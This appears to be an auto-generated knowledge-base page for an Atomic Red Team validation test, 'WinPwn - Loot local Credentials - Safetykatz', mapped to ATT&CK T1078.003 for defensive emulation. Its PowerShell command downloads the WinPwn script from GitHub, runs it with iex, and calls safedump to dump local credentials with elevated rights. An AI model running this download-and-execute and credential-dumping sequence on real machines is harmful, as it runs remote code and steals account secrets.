---
atomic_guid: "e9fdb899-a980-4ba4-934b-486ad22e22f4"
title: "WinPwn - Loot local Credentials - Safetykatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1078.003"
attack_technique_name: "Valid Accounts: Local Accounts"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "e9fdb899-a980-4ba4-934b-486ad22e22f4"
  - "WinPwn - Loot local Credentials - Safetykatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Loot local Credentials - Safetykatz

Loot local Credentials - Safetykatz technique via function of WinPwn

## Metadata

- Atomic GUID: e9fdb899-a980-4ba4-934b-486ad22e22f4
- Technique: T1078.003: Valid Accounts: Local Accounts
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1078.003/T1078.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1078-valid_accounts|T1078.003]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.yaml)
